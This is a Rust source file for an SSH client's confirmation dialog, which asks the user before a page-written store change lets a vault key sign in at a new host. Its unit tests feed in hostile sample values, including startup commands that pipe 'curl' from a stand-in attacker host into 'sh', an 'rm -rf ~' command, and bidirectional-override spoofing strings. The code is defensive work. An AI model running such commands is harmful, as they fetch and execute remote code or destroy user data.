//! Native confirmation for host and identity writes that let a vault key sign
//! in somewhere new.
//!
//! The page writes the store, and a saved host that signs in with a vault key
//! is a standing permission: use this key, as this account, against this
//! address. The first connection to an address trusts whatever server answers,
//! so a permission the page wrote on its own would hand the key's signature,
//! and a session the page can type into, to a server of its choosing. A write
//! that grants a permission no saved host holds yet is therefore confirmed in
//! the same OS-drawn dialog `host_key_prompt` shows, which a script can neither
//! read nor answer. `Store` refuses such a write unless it is handed what the
//! user confirmed, so a writer that skips this module cannot make it.
//!
//! What the dialog lists is worked out here from the store as it would stand
//! after the write, and a key is named from the vault's own metadata, so the
//! page never supplies a description of its own change. Writes that grant
//! nothing new go through without a question: renames, tags, groups, password
//! hosts, startup commands, and any edit that leaves every host's key reach
//! where it was.
//!
//! This guards against a page acting without the user, not against the user.
//! Whoever clicks Allow has allowed it.

use crate::host_key_prompt::{self, PromptGate};
use clavyn_core::key_reach::NewReach;
use clavyn_core::keys::KeyMeta;
use clavyn_core::store::{Store, StoreData};
use clavyn_core::CoreError;
use std::time::Duration;
use tauri::AppHandle;
use tokio::sync::Mutex;
use unicode_general_category::{get_general_category, GeneralCategory};
use uuid::Uuid;

/// Marks the error raised when the user answered the dialog with Cancel, so a
/// form can say the change was not saved without reporting it as a failure.
pub const DECLINED: &str = "[host-change-confirmation-declined]";

const TITLE: &str = "Allow a vault key to be used";

/// The most hosts one dialog asks about. Every host it asks about is listed in
/// full, because Allow must never approve a destination the dialog did not
/// name, and more than this would push the buttons below the screen. A write
/// that would let a key sign in at more hosts than this is refused without a
/// question, and the user makes the change in smaller steps.
const LISTED_HOSTS: usize = 5;

/// The longest each stored string may print, counted in what the dialog
/// shows, escapes included.
const LABEL_LIMIT: usize = 64;
const ADDRESS_LIMIT: usize = 255;
const COMMAND_LIMIT: usize = 300;

/// How long a Cancel in this dialog keeps it from opening again. Far shorter
/// than the host key gate's: after a Cancel the forms keep what was typed, so
/// it can be corrected and saved again, and that retry should be asked about
/// rather than refused. It still stops a script from reopening the dialog the
/// moment it is dismissed.
const DECLINE_COOLDOWN: Duration = Duration::from_secs(5);

/// The gate these dialogs share. It is kept apart from the host key gate so a
/// refusal of one kind of question does not silence the other.
pub fn gate() -> PromptGate {
    PromptGate::for_subject("host change", DECLINED, DECLINE_COOLDOWN)
}

/// Apply `edit` to the store, asking `confirm` first when the write would let a
/// vault key sign in somewhere new.
///
/// The decision and a write that needs no question happen under one lock, so
/// nothing can slip in between deciding "nothing new" and writing. The lock is
/// not held across the dialog, which can stay open for minutes while the store
/// keeps serving connections; the write is committed with exactly what the
/// dialog showed, and `Store` refuses it if, against the store as it is by
/// then, it would allow anything more.
pub async fn write_confirmed<E, F, Fut>(
    store: &Mutex<Store>,
    edit: E,
    confirm: F,
) -> Result<(), String>
where
    E: Fn(&mut StoreData),
    F: FnOnce(Vec<NewReach>) -> Fut,
    Fut: std::future::Future<Output = Result<(), String>>,
{
    let shown = {
        let mut store = store.lock().await;
        let reaches = store.preview(&edit);
        if reaches.is_empty() {
            return store
                .commit_confirmed(&edit, &[])
                .map_err(|e| e.to_string());
        }
        reaches
    };
    if shown.len() > LISTED_HOSTS {
        return Err(format!(
            "this change would let a vault key sign in at {} hosts where no saved host lets it sign \
             in yet, more than the {LISTED_HOSTS} one confirmation can list; make it in smaller \
             steps, a few hosts at a time",
            shown.len()
        ));
    }
    confirm(shown.clone()).await?;
    let mut store = store.lock().await;
    store.commit_confirmed(&edit, &shown).map_err(|e| match e {
        CoreError::UnconfirmedKeyReach => CHANGED_DURING_DIALOG.to_string(),
        e => e.to_string(),
    })
}

const CHANGED_DURING_DIALOG: &str =
    "the saved hosts changed while the confirmation was open; save again to review the change";

/// Ask the user, in a native dialog, to allow `reaches`. `keys` is the vault's
/// key metadata, or `None` while the vault is locked.
pub async fn confirm(
    app: &AppHandle,
    gate: &PromptGate,
    reaches: &[NewReach],
    keys: Option<&[KeyMeta]>,
) -> Result<(), String> {
    host_key_prompt::confirm(app, gate, TITLE, &message(reaches, keys), "Allow").await
}

/// The dialog text for `reaches`, every one of them listed.
pub fn message(reaches: &[NewReach], keys: Option<&[KeyMeta]>) -> String {
    let mut text = String::from(
        "This change lets a key from your vault sign in where no saved host lets it sign in \
         now:\n",
    );
    for new in reaches {
        let reach = &new.reach;
        text.push_str(&format!(
            "\n{}\n    {}@{}:{}\n    Key: {}\n",
            shown(&new.host_label, LABEL_LIMIT),
            shown(&reach.username, LABEL_LIMIT),
            address(&reach.hostname),
            reach.port,
            key_name(reach.key_id, keys),
        ));
        if let Some(command) = &new.startup_command {
            text.push_str(&format!(
                "    Runs on connect: {}\n",
                shown(command, COMMAND_LIMIT)
            ));
        }
    }
    let runs = if reaches.iter().any(|new| new.startup_command.is_some()) {
        " and the command runs on it"
    } else {
        ""
    };
    text.push_str(&format!(
        "\nThe first connection to an address trusts whichever server answers there, so the key \
         signs in to that server{runs}. Allow this only if you are making this change yourself."
    ));
    text
}

fn address(hostname: &str) -> String {
    let shown = shown(hostname, ADDRESS_LIMIT);
    if hostname.contains(':') {
        format!("[{shown}]")
    } else {
        shown
    }
}

fn key_name(id: Uuid, keys: Option<&[KeyMeta]>) -> String {
    match keys {
        None => format!("{id} (unlock the vault to see which key this is)"),
        Some(keys) => match keys.iter().find(|key| key.id == id) {
            Some(key) => format!("{} ({})", shown(&key.label, LABEL_LIMIT), key.fingerprint),
            None => format!("{id}, which is not in the vault"),
        },
    }
}

/// Whether `c` is printed as an escape rather than as itself.
///
/// Decided by general category rather than from a list of known offenders, so
/// a mark nobody thought of is caught along with the rest: controls (Cc),
/// format characters (Cf: zero-width characters, the marks that reorder
/// bidirectional text, tag characters), and line and paragraph separators (Zl,
/// Zp), which the dialog lays out as line breaks. Private-use and unassigned
/// code points (Co, Cn) are escaped too, since this build cannot say how the
/// system will draw them; a format character added in a later Unicode version
/// is unassigned here.
fn is_hidden(c: char) -> bool {
    use GeneralCategory::*;
    matches!(
        get_general_category(c),
        Control | Format | LineSeparator | ParagraphSeparator | PrivateUse | Unassigned
    )
}

/// Render a stored string for the dialog.
///
/// Every string here was written by the page. Line breaks, control characters
/// and layout marks could redraw the dialog — a label carrying a newline and a
/// reassuring paragraph, say — so they are printed as escapes. A long value is
/// cut with a count of what was left out, so padding cannot push the part that
/// matters out of view without the cut being visible. The limit counts what is
/// printed, so a value made of characters that each print as a long escape
/// takes no more room than any other; an escape is never cut in half.
fn shown(text: &str, limit: usize) -> String {
    let mut out = String::new();
    let mut printed = 0;
    let mut kept = 0;
    for c in text.chars() {
        let piece: String = if is_hidden(c) {
            c.escape_unicode().collect()
        } else {
            c.into()
        };
        let width = piece.chars().count();
        if printed + width > limit {
            break;
        }
        out.push_str(&piece);
        printed += width;
        kept += 1;
    }
    let left_out = text.chars().count() - kept;
    if left_out > 0 {
        out.push_str(&format!("… ({left_out} more characters)"));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use clavyn_core::host::{AuthMethod, Host};
    use clavyn_core::identity::Identity;
    use clavyn_core::key_reach::KeyReach;
    use clavyn_core::keys::KeyType;
    use std::sync::atomic::{AtomicUsize, Ordering};

    fn key_host(hostname: &str, key: Uuid) -> Host {
        let mut host = Host::new("prod", hostname, 22, "deploy");
        host.auth = AuthMethod::PublicKey;
        host.key_id = Some(key);
        host
    }

    fn password_host(hostname: &str) -> Host {
        let mut host = Host::new("lab", hostname, 22, "deploy");
        host.auth = AuthMethod::Password {
            credential_key: "default".into(),
        };
        host
    }

    fn new_reach(label: &str, hostname: &str, key: Uuid, command: Option<&str>) -> NewReach {
        NewReach {
            host_id: Uuid::new_v4(),
            host_label: label.into(),
            reach: KeyReach {
                key_id: key,
                username: "deploy".into(),
                hostname: hostname.into(),
                port: 22,
            },
            startup_command: command.map(str::to_owned),
        }
    }

    fn meta(id: Uuid, label: &str) -> KeyMeta {
        KeyMeta {
            id,
            label: label.into(),
            key_type: KeyType::Ed25519,
            fingerprint: "SHA256:fixturefingerprint".into(),
            public_key_base64: String::new(),
        }
    }

    fn store() -> (tempfile::TempDir, std::path::PathBuf, Mutex<Store>) {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("store.json");
        let store = Store::load(path.clone()).expect("load");
        (dir, path, Mutex::new(store))
    }

    #[tokio::test]
    async fn a_write_that_allows_nothing_new_is_saved_without_asking() {
        let (_dir, path, store) = store();
        let host = password_host("lab.example");
        write_confirmed(
            &store,
            |data| data.add_host(host.clone()),
            |_| async { panic!("a password host must not need a confirmation") },
        )
        .await
        .expect("saved");
        assert_eq!(Store::load(path).expect("reload").hosts().len(), 1);
    }

    #[tokio::test]
    async fn a_declined_confirmation_writes_nothing() {
        let (_dir, path, store) = store();
        let key = Uuid::new_v4();
        let host = key_host("attacker.example", key);
        let asked = AtomicUsize::new(0);

        let error = write_confirmed(
            &store,
            |data| data.add_host(host.clone()),
            |reaches| {
                asked.fetch_add(1, Ordering::SeqCst);
                assert_eq!(reaches.len(), 1);
                assert_eq!(reaches[0].reach.hostname, "attacker.example");
                assert_eq!(reaches[0].reach.key_id, key);
                async { Err(format!("{DECLINED} {TITLE}: cancelled")) }
            },
        )
        .await
        .expect_err("a declined write must fail");

        assert!(error.contains(DECLINED), "{error}");
        assert_eq!(asked.load(Ordering::SeqCst), 1);
        assert!(store.lock().await.hosts().is_empty());
        assert!(!path.exists(), "a declined write reached the disk");
    }

    #[tokio::test]
    async fn a_confirmed_write_is_saved() {
        let (_dir, path, store) = store();
        let host = key_host("prod.example", Uuid::new_v4());
        write_confirmed(
            &store,
            |data| data.add_host(host.clone()),
            |_| async { Ok(()) },
        )
        .await
        .expect("saved");
        assert_eq!(Store::load(path).expect("reload").hosts()[0].id, host.id);
    }

    #[tokio::test]
    async fn an_identity_edit_asks_about_every_host_it_would_send_the_key_to() {
        let (_dir, _path, store) = store();
        let identity = Identity::new("ops", "root");
        {
            let mut store = store.lock().await;
            store.add_identity(identity.clone()).expect("identity");
            for hostname in ["web.example", "db.example"] {
                let mut host = password_host(hostname);
                host.identity_id = Some(identity.id);
                store.add_host(host).expect("host");
            }
        }

        let mut keyed = identity.clone();
        keyed.auth = AuthMethod::PublicKey;
        keyed.key_id = Some(Uuid::new_v4());
        let error = write_confirmed(
            &store,
            |data| data.update_identity(keyed.clone()),
            |reaches| {
                let hostnames: Vec<_> = reaches.iter().map(|r| r.reach.hostname.clone()).collect();
                assert_eq!(hostnames, ["web.example", "db.example"]);
                async { Err("declined".to_string()) }
            },
        )
        .await
        .expect_err("declined");
        assert_eq!(error, "declined");
        assert_eq!(
            store.lock().await.identities()[0].auth,
            AuthMethod::Agent,
            "the identity changed although the write was declined"
        );
    }

    /// An identity linked by `count` password hosts, and the same identity
    /// switched to a vault key, which gives every one of them the key.
    async fn identity_linked_by(store: &Mutex<Store>, count: usize) -> Identity {
        let identity = Identity::new("ops", "root");
        let mut store = store.lock().await;
        store.add_identity(identity.clone()).expect("identity");
        for i in 0..count {
            let mut host = password_host(&format!("h{i}.example"));
            host.identity_id = Some(identity.id);
            store.add_host(host).expect("host");
        }
        let mut keyed = identity;
        keyed.auth = AuthMethod::PublicKey;
        keyed.key_id = Some(Uuid::new_v4());
        keyed
    }

    #[tokio::test]
    async fn a_dialog_asks_about_every_host_it_approves() {
        let (_dir, _path, store) = store();
        let keyed = identity_linked_by(&store, LISTED_HOSTS).await;
        write_confirmed(
            &store,
            |data| data.update_identity(keyed.clone()),
            |reaches| {
                assert_eq!(reaches.len(), LISTED_HOSTS);
                let text = message(&reaches, None);
                for i in 0..LISTED_HOSTS {
                    assert!(text.contains(&format!("root@h{i}.example:22")), "{text}");
                }
                assert!(!text.contains("more host"), "{text}");
                async { Ok(()) }
            },
        )
        .await
        .expect("saved");
        assert_eq!(
            store.lock().await.identities()[0].auth,
            AuthMethod::PublicKey
        );
    }

    #[tokio::test]
    async fn a_write_reaching_more_hosts_than_a_dialog_lists_is_refused_unasked() {
        let (_dir, _path, store) = store();
        let keyed = identity_linked_by(&store, LISTED_HOSTS + 1).await;
        let error = write_confirmed(
            &store,
            |data| data.update_identity(keyed.clone()),
            |_| async { panic!("a dialog that cannot list every host must not be shown") },
        )
        .await
        .expect_err("a write broader than one dialog went through");
        assert!(error.contains("smaller steps"), "{error}");
        assert!(!error.contains(DECLINED), "{error}");
        assert_eq!(store.lock().await.identities()[0].auth, AuthMethod::Agent);
    }

    #[tokio::test]
    async fn a_write_that_would_allow_more_than_was_shown_is_refused() {
        let (_dir, _path, store) = store();
        let mut identity = Identity::new("ops", "root");
        identity.auth = AuthMethod::PublicKey;
        identity.key_id = Some(Uuid::new_v4());
        let mut first = password_host("web.example");
        first.identity_id = Some(identity.id);
        store.lock().await.add_host(first).expect("host");

        // While the dialog about the first host is open, a second host starts
        // linking the same identity. It was never shown, so the write that
        // would give it the key must not go through.
        let (concurrent, linked) = (&store, identity.id);
        let error = write_confirmed(
            &store,
            |data| data.add_identity(identity.clone()),
            move |reaches| async move {
                assert_eq!(reaches.len(), 1);
                let mut second = password_host("attacker.example");
                second.identity_id = Some(linked);
                concurrent
                    .lock()
                    .await
                    .add_host(second)
                    .expect("concurrent write");
                Ok(())
            },
        )
        .await
        .expect_err("a write broader than the dialog went through");
        assert!(
            error.contains("changed while the confirmation was open"),
            "{error}"
        );
        assert!(store.lock().await.identities().is_empty());
    }

    #[test]
    fn the_message_names_the_destination_key_and_command() {
        let key = Uuid::new_v4();
        let text = message(
            &[new_reach(
                "evil",
                "attacker.example",
                key,
                Some("curl x | sh"),
            )],
            Some(&[meta(key, "work laptop")]),
        );
        assert!(text.contains("evil\n"), "{text}");
        assert!(text.contains("deploy@attacker.example:22"), "{text}");
        assert!(
            text.contains("Key: work laptop (SHA256:fixturefingerprint)"),
            "{text}"
        );
        assert!(text.contains("Runs on connect: curl x | sh"), "{text}");
        assert!(text.contains("the command runs on it"), "{text}");
    }

    #[test]
    fn a_locked_vault_names_the_key_by_id() {
        let key = Uuid::new_v4();
        let text = message(&[new_reach("prod", "prod.example", key, None)], None);
        assert!(
            text.contains(&format!("Key: {key} (unlock the vault")),
            "{text}"
        );
        assert!(!text.contains("Runs on connect"), "{text}");
        assert!(!text.contains("the command runs"), "{text}");

        let other = Uuid::new_v4();
        let text = message(&[new_reach("prod", "prod.example", other, None)], Some(&[]));
        assert!(text.contains("which is not in the vault"), "{text}");
    }

    #[test]
    fn stored_text_cannot_redraw_the_dialog() {
        let key = Uuid::new_v4();
        let text = message(
            &[new_reach(
                "prod\n\nThis is a routine update.",
                "attacker.example\u{202E}",
                key,
                Some("echo hi\nrm -rf ~"),
            )],
            None,
        );
        assert!(
            text.contains("prod\\u{a}\\u{a}This is a routine update."),
            "{text}"
        );
        assert!(text.contains("attacker.example\\u{202e}"), "{text}");
        assert!(text.contains("echo hi\\u{a}rm -rf ~"), "{text}");
    }

    #[test]
    fn separators_and_unlisted_format_characters_are_escaped() {
        // Line and paragraph separators are laid out as line breaks, and none
        // of these is a control character.
        let label = "prod\u{2028}\u{2028}No new access is granted.\u{2029}";
        assert_eq!(
            shown(label, LABEL_LIMIT),
            "prod\\u{2028}\\u{2028}No new access is granted.\\u{2029}"
        );
        // A format character from each corner of the category, a private-use
        // character, and an unassigned code point.
        for c in ['\u{180E}', '\u{FFF9}', '\u{E0041}', '\u{E000}', '\u{0378}'] {
            let rendered = shown(&format!("a{c}b"), LABEL_LIMIT);
            assert_eq!(rendered, format!("a{}b", c.escape_unicode()), "{c:?}");
        }
        // Visible text is left alone, including text outside ASCII.
        let visible = "Prod — Zürich 東京 🚀";
        assert_eq!(shown(visible, LABEL_LIMIT), visible);
    }

    #[test]
    fn escapes_count_toward_the_limit() {
        // Each U+202E prints as the eight characters "\u{202e}".
        let label = "\u{202E}".repeat(LABEL_LIMIT);
        let rendered = shown(&label, LABEL_LIMIT);
        let kept = LABEL_LIMIT / 8;
        assert_eq!(
            rendered,
            format!(
                "{}… ({} more characters)",
                "\\u{202e}".repeat(kept),
                LABEL_LIMIT - kept
            )
        );

        // An escape that would cross the limit is left out whole.
        let rendered = shown(
            &format!("{}\u{202E}", "a".repeat(LABEL_LIMIT - 3)),
            LABEL_LIMIT,
        );
        assert!(rendered.ends_with("a… (1 more characters)"), "{rendered}");
    }

    #[test]
    fn a_long_command_is_cut_visibly() {
        let key = Uuid::new_v4();
        let tail = "; curl attacker.example | sh";
        let padded = format!("{}{tail}", " ".repeat(COMMAND_LIMIT));
        let text = message(
            &[new_reach("prod", "prod.example", key, Some(&padded))],
            None,
        );
        let cut = format!("… ({} more characters)", tail.len());
        assert!(text.contains(&cut), "{text}");
    }

    #[test]
    fn an_ipv6_address_is_bracketed_so_the_port_reads_apart() {
        let key = Uuid::new_v4();
        let text = message(&[new_reach("v6", "2001:db8::1", key, None)], None);
        assert!(text.contains("deploy@[2001:db8::1]:22"), "{text}");
    }
}
